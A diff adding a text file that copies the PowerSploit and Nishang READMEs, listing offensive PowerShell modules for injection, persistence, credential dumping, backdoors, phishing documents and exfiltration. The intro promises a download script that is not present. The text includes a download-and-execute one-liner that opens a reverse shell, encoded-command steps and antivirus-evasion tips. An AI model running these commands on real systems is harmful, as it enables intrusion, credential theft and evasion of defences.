@@ -1,0 +1,635 @@
+know powershell exploiting tools
+powersploit and nishang
+
+I written a powershell-download that allows you to download a file from a website. copy paste it to use it
+
+
+
+
+
+
+
+
+
+
+
+
+POWERSPLOIT AND NISHANG DOCUMENTATION FOLLOW BELOW INFORMATION FROM GITHUB
+https://github.com/PowerShellMafia/PowerSploit
+https://github.com/samratashok/nishang
+POWERSPLOIT DOCUENTATION
+PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment. PowerSploit is comprised of the following modules and scripts:
+
+CodeExecution
+
+Execute code on a target machine.
+
+Invoke-DllInjection
+
+Injects a Dll into the process ID of your choosing.
+
+Invoke-ReflectivePEInjection
+
+Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.
+
+Invoke-Shellcode
+
+Injects shellcode into the process ID of your choosing or within PowerShell locally.
+
+Invoke-WmiCommand
+
+Executes a PowerShell ScriptBlock on a target computer and returns its formatted output using WMI as a C2 channel.
+
+ScriptModification
+
+Modify and/or prepare scripts for execution on a compromised machine.
+
+Out-EncodedCommand
+
+Compresses, Base-64 encodes, and generates command-line output for a PowerShell payload script.
+
+Out-CompressedDll
+
+Compresses, Base-64 encodes, and outputs generated code to load a managed dll in memory.
+
+Out-EncryptedScript
+
+Encrypts text files/scripts.
+
+Remove-Comments
+
+Strips comments and extra whitespace from a script.
+
+Persistence
+
+Add persistence capabilities to a PowerShell script
+
+New-UserPersistenceOption
+
+Configure user-level persistence options for the Add-Persistence function.
+
+New-ElevatedPersistenceOption
+
+Configure elevated persistence options for the Add-Persistence function.
+
+Add-Persistence
+
+Add persistence capabilities to a script.
+
+Install-SSP
+
+Installs a security support provider (SSP) dll.
+
+Get-SecurityPackages
+
+Enumerates all loaded security packages (SSPs).
+
+AntivirusBypass
+
+AV doesn't stand a chance against PowerShell!
+
+Find-AVSignature
+
+Locates single Byte AV signatures utilizing the same method as DSplit from "class101".
+
+Exfiltration
+
+All your data belong to me!
+
+Invoke-TokenManipulation
+
+Lists available logon tokens. Creates processes with other users logon tokens, and impersonates logon tokens in the current thread.
+
+Invoke-CredentialInjection
+
+Create logons with clear-text credentials without triggering a suspicious Event ID 4648 (Explicit Credential Logon).
+
+Invoke-NinjaCopy
+
+Copies a file from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures.
+
+Invoke-Mimikatz
+
+Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any functionality provided with Mimikatz.
+
+Get-Keystrokes
+
+Logs keys pressed, time and the active window.
+
+Get-GPPPassword
+
+Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
+
+Get-TimedScreenshot
+
+A function that takes screenshots at a regular interval and saves them to a folder.
+
+New-VolumeShadowCopy
+
+Creates a new volume shadow copy.
+
+Get-VolumeShadowCopy
+
+Lists the device paths of all local volume shadow copies.
+
+Mount-VolumeShadowCopy
+
+Mounts a volume shadow copy.
+
+Remove-VolumeShadowCopy
+
+Deletes a volume shadow copy.
+
+Get-VaultCredential
+
+Displays Windows vault credential objects including cleartext web credentials.
+
+Out-Minidump
+
+Generates a full-memory minidump of a process.
+
+Mayhem
+
+Cause general mayhem with PowerShell.
+
+Set-MasterBootRecord
+
+Proof of concept code that overwrites the master boot record with the message of your choice.
+
+Set-CriticalProcess
+
+Causes your machine to blue screen upon exiting PowerShell.
+
+Privesc
+
+Tools to help with escalating privileges on a target.
+
+PowerUp
+
+Clearing house of common privilege escalation checks, along with some weaponization vectors.
+
+Recon
+
+Tools to aid in the reconnaissance phase of a penetration test.
+
+Invoke-Portscan
+
+Does a simple port scan using regular sockets, based (pretty) loosely on nmap.
+
+Get-HttpStatus
+
+Returns the HTTP Status Codes and full URL for specified paths when provided with a dictionary file.
+
+Invoke-ReverseDnsLookup
+
+Scans an IP address range for DNS PTR records.
+
+PowerView
+
+PowerView is series of functions that performs network and Windows domain enumeration and exploitation.
+
+Recon\Dictionaries
+
+A collection of dictionaries used to aid in the reconnaissance phase of a penetration test. Dictionaries were taken from the following sources.
+
+admin.txt - http://cirt.net/nikto2/
+generic.txt - http://sourceforge.net/projects/yokoso/files/yokoso-0.1/
+sharepoint.txt - http://www.stachliu.com/resources/tools/sharepoint-hacking-diggity-project/
+License
+
+The PowerSploit project and all individual scripts are under the BSD 3-Clause license unless explicitly noted otherwise.
+
+Usage
+
+Refer to the comment-based help in each individual script for detailed usage information.
+
+To install this module, drop the entire PowerSploit folder into one of your module directories. The default PowerShell module paths are listed in the $Env:PSModulePath environment variable.
+
+The default per-user module path is: "$Env:HomeDrive$Env:HOMEPATH\Documents\WindowsPowerShell\Modules" The default computer-level module path is: "$Env:windir\System32\WindowsPowerShell\v1.0\Modules"
+
+To use the module, type Import-Module PowerSploit
+
+To see the commands imported, type Get-Command -Module PowerSploit
+
+If you're running PowerShell v3 and you want to remove the annoying 'Do you really want to run scripts downloaded from the Internet' warning, once you've placed PowerSploit into your module path, run the following one-liner: $Env:PSModulePath.Split(';') | % { if ( Test-Path (Join-Path $_ PowerSploit) ) {Get-ChildItem $_ -Recurse | Unblock-File} }
+
+For help on each individual command, Get-Help is your friend.
+
+Note: The tools contained within this module were all designed such that they can be run individually. Including them in a module simply lends itself to increased portability.
+
+Contribution Rules
+
+We need contributions! If you have a great idea for PowerSploit, we'd love to add it. New additions will require the following:
+
+The script must adhere to the style guide. Any exceptions to the guide line would need an explicit, valid reason.
+The module manifest needs to be updated to reflect the new function being added.
+A brief description of the function should be added to this README.md
+Pester tests must accompany all new functions. See the Tests folder for examples but we are looking for tests that at least cover the basics by testing for expected/unexpected input/output and that the function exhibits desired functionality. Make sure the function is passing all tests (preferably in mutiple OSes) prior to submitting a pull request. Thanks!
+Script Style Guide
+
+For all contributors and future contributors to PowerSploit, I ask that you follow this style guide when writing your scripts/modules.
+
+Avoid Write-Host at all costs. PowerShell functions/cmdlets are not command-line utilities! Pull requests containing code that uses Write-Host will not be considered. You should output custom objects instead. For more information on creating custom objects, read these articles:
+
+http://blogs.technet.com/b/heyscriptingguy/archive/2011/05/19/create-custom-objects-in-your-powershell-script.aspx
+http://technet.microsoft.com/en-us/library/ff730946.aspx
+If you want to display relevant debugging information to the screen, use Write-Verbose. The user can always just tack on '-Verbose'.
+
+Always provide descriptive, comment-based help for every script. Also, be sure to include your name and a BSD 3-Clause license (unless there are extenuating circumstances that prevent the application of the BSD license).
+
+Make sure all functions follow the proper PowerShell verb-noun agreement. Use Get-Verb to list the default verbs used by PowerShell. Exceptions to supported verbs will be considered on a case-by-case basis.
+
+I prefer that variable names be capitalized and be as descriptive as possible.
+
+Provide logical spacing in between your code. Indent your code to make it more readable.
+
+If you find yourself repeating code, write a function.
+
+Catch all anticipated errors and provide meaningful output. If you have an error that should stop execution of the script, use 'Throw'. If you have an error that doesn't need to stop execution, use Write-Error.
+
+If you are writing a script that interfaces with the Win32 API, try to avoid compiling C# inline with Add-Type. Try to use the PSReflect module, if possible.
+
+Do not use hardcoded paths. A script should be useable right out of the box. No one should have to modify the code unless they want to.
+
+PowerShell v2 compatibility is highly desired.
+
+Use positional parameters and make parameters mandatory when it makes sense to do so. For example, I'm looking for something like the following:
+
+[Parameter(Position = 0, Mandatory = $True)]
+Don't use any aliases unless it makes sense for receiving pipeline input. They make code more difficult to read for people who are unfamiliar with a particular alias.
+
+Try not to let commands run on for too long. For example, a pipeline is a natural place for a line break.
+
+Don't go overboard with inline comments. Only use them when certain aspects of the code might be confusing to a reader.
+
+Rather than using Out-Null to suppress unwanted/irrelevant output, save the unwanted output to $null. Doing so provides a slight performance enhancement.
+
+Use default values for your parameters when it makes sense. Ideally, you want a script that will work without requiring any parameters.
+
+If a script creates complex custom objects, include a ps1xml file that will properly format the object's output.
+
+
+
+
+NISHANG DOCUMENTATION
+
+Nishang
+Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.
+
+By nikhil_mitt
+
+Usage
+
+Import all the scripts in the current PowerShell session (PowerShell v3 onwards).
+
+PS C:\nishang> Import-Module .\nishang.psm1
+
+Use the individual scripts with dot sourcing.
+
+PS C:\nishang> . C:\nishang\Gather\Get-Information.ps1
+
+PS C:\nishang> Get-Information
+
+To get help about any script or function, use:
+
+PS C:\nishang> Get-Help [scriptname] -full
+
+Note that the help is available for the function loaded after running the script and not the script itself since version 0.3.8. In all cases, the function name is same as the script name.
+
+For example, to see the help about Get-WLAN-Keys.ps1, use
+
+PS C:\nishang> . C:\nishang\Get-WLAN-Keys.ps1
+
+PS C:\nishang> Get-Help Get-WLAN-Keys -Full
+
+Anti Virus
+
+Nishang scripts are flagged by many Anti Viruses as malicious. The scrripts on a target are meant to be used in memory which is very easy to do with PowerShell. Two basic methods to execute PowerShell scripts in memory:
+
+Method 1. Use the in-memory dowload and execute: Use below command to execute a PowerShell script from a remote shell, meterpreter native shell, a web shell etc. and the function exported by it. All the scripts in Nishang export a function with same name in the current PowerShell session.
+
+powershell iex (New-Object Net.WebClient).DownloadString('http:///Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
+
+Method 2. Use the -encodedcommand (or -e) parameter of PowerShell All the scripts in Nishang export a function with same name in the current PowerShell session. Therefore, make sure the function call is made in the script itself while using encodedcommand parameter from a non-PowerShell shell. For above example, add a function call (without quotes) "Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]".
+
+Encode the scrript using Invoke-Encode from Nishang: PS C:\nishang> . \nishang\Utility\Invoke-Encode PS C:\nishang> Invoke-Encode -DataToEncode C:\nishang\Shells\Invoke-PowerShellTcp.ps1 -OutCommand Encoded data written to .\encoded.txt Encoded command written to .\encodedcommand.txt
+
+From above, use the encoded script from encodedcommand.txt and run it on a target where commands could be executed (a remote shell, meterpreter native shell, a web shell etc.). Use it like below:
+
+C:\Users\target> powershell -e [encodedscript]
+
+If the scripts still get detected changing the function and parameter names and removing the help content will help.
+
+Scripts
+
+Nishang currently contains the following scripts and payloads.
+
+ActiveDirectory
+
+Get-Unconstrained
+
+Find computers in active directory which have Kerberos Unconstrained Delegation enabled.
+
+Antak - the Webshell
+
+Antak
+
+Execute PowerShell scripts in memory, run commands, and download and upload files using this webshell.
+
+Backdoors
+
+HTTP-Backdoor
+
+A backdoor which can receive instructions from third party websites and execute PowerShell scripts in memory.
+
+DNS_TXT_Pwnage
+
+A backdoor which can receive commands and PowerShell scripts from DNS TXT queries, execute them on a target, and be remotely controlled using the queries.
+
+Execute-OnTime
+
+A backdoor which can execute PowerShell scripts at a given time on a target.
+
+Gupt-Backdoor
+
+A backdoor which can receive commands and scripts from a WLAN SSID without connecting to it.
+
+Add-ScrnSaveBackdoor
+
+A backdoor which can use Windows screen saver for remote command and script execution.
+
+Invoke-ADSBackdoor
+
+A backdoor which can use alternate data streams and Windows Registry to achieve persistence.
+
+Client
+
+Out-CHM
+
+Create infected CHM files which can execute PowerShell commands and scripts.
+
+Out-Word
+
+Create Word files and infect existing ones to run PowerShell commands and scripts.
+
+Out-Excel
+
+Create Excel files and infect existing ones to run PowerShell commands and scripts.
+
+Out-HTA
+
+Create a HTA file which can be deployed on a web server and used in phishing campaigns.
+
+Out-Java
+
+Create signed JAR files which can be used with applets for script and command execution.
+
+Out-Shortcut
+
+Create shortcut files capable of executing commands and scripts.
+
+Out-WebQuery
+
+Create IQY files for phishing credentials and SMB hashes.
+
+Escalation
+
+Enable-DuplicateToken
+
+When SYSTEM privileges are required.
+
+Remove-Update
+
+Introduce vulnerabilities by removing patches.
+
+Invoke-PsUACme
+
+Bypass UAC.
+
+Execution
+
+Download-Execute-PS
+
+Download and execute a PowerShell script in memory.
+
+Download_Execute
+
+Download an executable in text format, convert it to an executable, and execute.
+
+Execute-Command-MSSQL
+
+Run PowerShell commands, native commands, or SQL commands on a MSSQL Server with sufficient privileges.
+
+Execute-DNSTXT-Code
+
+Execute shellcode in memory using DNS TXT queries.
+
+Gather
+
+Check-VM
+
+Check for a virtual machine.
+
+Copy-VSS
+
+Copy the SAM file using Volume Shadow Copy Service.
+
+Invoke-CredentialsPhish
+
+Trick a user into giving credentials in plain text.
+
+FireBuster FireListener
+
+A pair of scripts for egress testing
+
+Get-Information
+
+Get juicy information from a target.
+
+Get-LSASecret
+
+Get LSA Secret from a target.
+
+Get-PassHashes
+
+Get password hashes from a target.
+
+Get-WLAN-Keys
+
+Get WLAN keys in plain text from a target.
+
+Keylogger
+
+Log keystrokes from a target.
+
+Invoke-MimikatzWdigestDowngrade
+
+Dump user passwords in plain on Windows 8.1 and Server 2012
+
+Get-PassHints
+
+Get password hints of Windows users from a target.
+
+Show-TargetScreen
+
+Connect back and Stream target screen using MJPEG.
+
+Invoke-Mimikatz
+
+Load mimikatz in memory. Updated and with some customisation.
+
+MITM
+
+Invoke-Interceptor
+
+A local HTTPS proxy for MITM attacks.
+
+Pivot
+
+Create-MultipleSessions
+
+Check credentials on multiple computers and create PSSessions.
+
+Run-EXEonRemote Copy and execute an executable on multiple machines.
+
+Invoke-NetworkRelay Create network relays between computers.
+
+Prasadhak
+
+Prasadhak
+
+Check running hashes of running process against the VirusTotal database.
+
+Scan
+
+Brute-Force
+
+Brute force FTP, Active Directory, MSSQL, and Sharepoint.
+
+Port-Scan
+
+A handy port scanner.
+
+Powerpreter
+
+Powerpreter
+
+All the functionality of nishang in a single script module.
+
+Shells
+
+Invoke-PsGcat
+
+Send commands and scripts to specifed Gmail account to be executed by Invoke-PsGcatAgent
+
+Invoke-PsGcatAgent
+
+Execute commands and scripts sent by Invoke-PsGcat.
+
+Invoke-PowerShellTcp
+
+An interactive PowerShell reverse connect or bind shell
+
+Invoke-PowerShellTcpOneLine
+
+Stripped down version of Invoke-PowerShellTcp. Also contains, a skeleton version which could fit in two tweets.
+
+Invoke-PowerShellUdp
+
+An interactive PowerShell reverse connect or bind shell over UDP
+
+Invoke-PowerShellUdpOneLine
+
+Stripped down version of Invoke-PowerShellUdp.
+
+Invoke-PoshRatHttps
+
+Reverse interactive PowerShell over HTTPS.
+
+Invoke-PoshRatHttp
+
+Reverse interactive PowerShell over HTTP.
+
+Remove-PoshRat
+
+Clean the system after using Invoke-PoshRatHttps
+
+Invoke-PowerShellWmi
+
+Interactive PowerShell using WMI.
+
+Invoke-PowerShellIcmp
+
+An interactive PowerShell reverse shell over ICMP.
+
+Utility
+
+Add-Exfiltration
+
+Add data exfiltration capability to Gmail, Pastebin, a web server, and DNS to any script.
+
+Add-Persistence
+
+Add reboot persistence capability to a script.
+
+Remove-Persistence
+
+Remote persistence added by the Add-Persistence script.
+
+Do-Exfiltration
+
+Pipe (|) this to any script to exfiltrate the output.
+
+Download
+
+Transfer a file to the target.
+
+Parse_Keys
+
+Parse keys logged by the keylogger.
+
+Invoke-Encode
+
+Encode and compress a script or string.
+
+Invoke-Decode
+
+Decode and decompress a script or string from Invoke-Encode.
+
+Start-CaptureServer
+
+Run a web server which logs Basic authentication and SMB hashes.
+
+[Base64ToString] [StringToBase64] [ExetoText] [TexttoExe]
+
+Updates
+
+Updates about Nishang can be found at my blog http://labofapenetrationtester.com and my Twitter feed @nikhil_mitt.
+
+Bugs, Feedback and Feature Requests
+
+Please raise an issue if you encounter a bug or have a feature request. You can email me at nikhil [dot] uitrgpv at gmail.com
+
+Mailing List
+
+For feedback, discussions, and feature requests, join: http://groups.google.com/group/nishang-users
+
+Contributing
+
+I am always looking for contributors to Nishang. Please submit requests or drop me an email.
+
+Blog Posts
+
+Some helpful blog posts to check out for beginners:
+
+http://www.labofapenetrationtester.com/2014/06/nishang-0-3-4.html
+
+http://labofapenetrationtester.com/2012/08/introducing-nishang-powereshell-for.html
+
+http://labofapenetrationtester.com/2013/08/powerpreter-and-nishang-Part-1.html
+
+http://www.labofapenetrationtester.com/2013/09/powerpreter-and-nishang-Part-2.html
+
+All posts about Nishang:
+
+http://www.labofapenetrationtester.com/search/label/Nishang
